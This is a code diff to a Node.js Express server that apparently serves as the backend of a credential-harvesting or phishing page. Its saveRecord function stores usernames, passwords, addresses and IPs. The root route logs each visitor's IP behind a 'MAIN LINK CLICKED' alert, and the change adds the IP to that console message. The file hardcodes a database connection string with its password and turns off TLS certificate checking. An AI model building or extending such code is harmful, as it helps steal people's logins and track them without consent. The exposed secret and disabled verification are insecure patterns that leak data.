@@ -6,7 +6,7 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
+// Supabase Connection (your exact string)
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
@@ -36,7 +36,7 @@ function saveRecord(type, username = null, password = null, address = null, ip =
 app.get('/', (req, res) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("🔴 MAIN LINK CLICKED! Someone opened your website.");
+    console.log("🔴 MAIN LINK CLICKED! Someone opened your website. IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
